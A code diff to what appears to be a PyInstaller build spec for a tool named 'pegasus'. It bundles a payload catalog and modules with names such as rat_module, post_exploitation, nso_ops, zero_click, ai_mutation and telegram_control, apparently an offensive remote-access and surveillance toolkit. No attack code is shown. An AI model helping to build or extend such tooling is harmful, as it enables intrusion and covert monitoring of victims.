@@ -25,6 +25,7 @@ MODULE_NAMES = [
     "passgen",
     "brutdroid",
     "access_workflow",
+    "access_workflow",
     "access_workflow/post_exploitation",
 ]
 
@@ -34,6 +35,7 @@ datas = [
     (str(MODULES / "access_workflow" / "templates"), "pegasus/modules/access_workflow/templates"),
     (str(MODULES / "access_workflow" / "static"), "pegasus/modules/access_workflow/static"),
     (str(ROOT / "assets" / "icons" / "web" / "pegasus_icon.png"), "assets/icons/web"),
+    (str(MODULES / "access_workflow" / "catalog_payloads"), "pegasus/modules/access_workflow/catalog_payloads"),
 ]
 
 # Ship plugin sources as data so file-based discovery also works when frozen.
@@ -74,6 +76,18 @@ hiddenimports = [
     "pegasus.modules.access_workflow.rat_module",
     "pegasus.modules.analysis.module",
     "pegasus.modules.integrations.slash_commands",
+    "pegasus.modules.access_workflow.auth",
+    "pegasus.modules.access_workflow.delivery",
+    "pegasus.modules.access_workflow.catalog",
+    "pegasus.modules.access_workflow.capabilities",
+    "pegasus.modules.access_workflow.nso_ops",
+    "pegasus.modules.access_workflow.nso_capabilities",
+    "pegasus.modules.access_workflow.dna",
+    "pegasus.modules.access_workflow.ai_mutation",
+    "pegasus.modules.access_workflow.steganography",
+    "pegasus.modules.access_workflow.telegram_control",
+    "pegasus.modules.access_workflow.frp_unlock",
+    "pegasus.modules.access_workflow.zero_click.registry",
 ]
 
 # Every module plugin package + submodule, so builtin loading works when frozen.
